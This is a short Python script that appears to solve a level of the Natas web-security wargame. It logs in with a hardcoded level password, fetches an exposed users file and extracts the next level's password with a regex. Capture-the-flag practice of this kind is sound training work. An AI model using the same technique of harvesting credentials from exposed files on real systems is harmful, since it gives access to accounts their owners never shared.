# -*- coding: utf-8 -*-
from base import get_page
import re

username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
content = get_page(2, username, password, "/files/users.txt")
password = re.search(r"(?<=natas3:)\w+", content)
if password is not None:
    print(password.group(0))
else:
    print("Fail to find password")